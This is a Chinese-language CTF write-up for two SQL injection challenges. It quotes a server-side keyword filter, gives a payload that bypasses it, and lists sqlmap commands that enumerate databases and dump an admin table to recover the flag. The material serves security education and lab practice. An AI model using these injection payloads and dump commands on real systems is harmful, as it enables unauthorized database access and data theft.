12月6日，铁幕安全联合杭州安恒、太原工业学院举办第一届CTF竞赛。本次CTF比赛解题思路如下：  

* * *

**ezsql （sql注入类型）15分**

该地址的sql.php文件中存在sql注入。

![](../Images/d6ae0abf2f7d9529bc0c753ca3233df1.png)

![](../Images/ec7bdbeb729b65c37ee094e544eb088d.png)

```
if(preg\_match('/UNION.+?SELECT|\\/\\\*.\*\\\*\\/|sleep|and|if|&&|\\|\\||\\^|%|ascii|mid|left|greatest|least|substr|=|-|<|>|benchmark|like|in|between|regexp/is', $id)) {
    die('SQL Injection');
}
```

这是服务端上的过滤脚本

可以用以下payload绕过

id=22'or strcmp(hex(right((select database()),4)),'637466')%23

当前数据库名称为CTF

剩下需要自己跑库的表名和字段

id=22'or strcmp(hex(right((select database()),4)),'637466')%23

payload放在下划线部分

**搜索引擎（sql注入） 5分**

打开搜索引擎页面

![](../Images/8e006283c47981d57b3dcbfe77d562df.png)

思路：

搜索框首先想到的就是sql注入了。尝试抓包跑一下sqlmap

![](../Images/990730142f6bd818438e04ae90f44b4c.png)

使用命令开始测试，果然有注入

sqlmap.py-r C:\\新建文本文档.txt

![](../Images/29b0c0f210fcc89f7b34e209d4811285.png)

接下来就需要一步步拿到flag了，首先知道有多少库

sqlmap.py-r C:\\新建文本文档.txt --dbs

![](../Images/817c262e62b9e7c7ddd4373c4435ddcc.png)

news库更可疑一些，继续测试

sqlmap.py-r C:\\新建文本文档.txt -D news --tables

![](../Images/4865968ffaf59adf91ee1ebb5cfd97cd.png)

继续admin

sqlmap.py-r C:\\新建文本文档.txt -D news -T admin--columns

![](../Images/c9df15f5c6224cc6670cd1cb9db7f74b.png)

这样就看到flag字段了，继续读出

sqlmap.py -r C:\\新建文本文档.txt -D news -T admin --columns --dump

![](../Images/793a307c9effcf25c06d7382640cea99.png)
